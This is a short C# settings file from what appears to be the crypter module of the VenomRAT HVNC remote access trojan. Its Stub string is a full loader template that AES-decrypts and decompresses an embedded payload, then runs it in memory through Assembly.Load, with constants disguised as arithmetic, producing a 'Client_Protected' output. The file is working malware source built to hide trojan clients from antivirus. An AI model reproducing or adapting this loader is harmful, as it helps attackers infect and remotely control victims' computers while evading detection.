namespace VenomRAT_HVNC.Crypter.Settings;

public class Settings
{
    public static string Stub { get; set; } = "using System;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Reflection;\nusing System.Security.Cryptography;\nusing System.Text;\n\nnamespace Stub\n{\n    static class Program\n    {\n        /// <summary>\n        /// The main entry point for the application.\n        /// </summary>\n        [STAThread]\n        static void Main()\n        {\n            string passwordAesCompressStub = \"#PASSWORD_AES_COMPRESS_STUB#\";\n            string payloadAesCompressStub = \"#PAYLOAD_AES_COMPRESS_STUB#\";\n            Assembly.Load(\n                    Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub),\n                        passwordAesCompressStub))).EntryPoint\n                .Invoke(null, null);\n        }\n\n        //Use : Decompress(AES_Decrypt(input,\"key\"));\n        public static byte[] AES_Decrypt(byte[] payload, string key)\n        {\n            AesManaged aes256 = new AesManaged();\n            MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider();\n            aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));\n            aes256.Mode = CipherMode.ECB;\n            byte[] decrypt = aes256.CreateDecryptor().TransformFinalBlock(payload, 50 - 50, payload.Length);\n            return decrypt;\n        }\n\n\n        public static byte[] Decompress(byte[] decompressData)\n        {\n            MemoryStream decompressMemoryStream = new MemoryStream();\n            IntPtr decompressLength = (IntPtr)BitConverter.ToInt32(decompressData, 200 - 50 * 4);\n            decompressMemoryStream.Write(decompressData, 4 * 1, decompressData.Length - 8 / 2);\n            byte[] decompressBuffer = new byte[(int)decompressLength];\n            decompressMemoryStream.Position = 700 + 300 - 100 * 10;\n            GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress);\n            int read = decompressZip.Read(decompressBuffer, 100 - 50 * 2, decompressBuffer.Length);\n            return decompressBuffer;\n        }\n    }\n}";
    public static string FileName { get; } = "Client_Protected";
}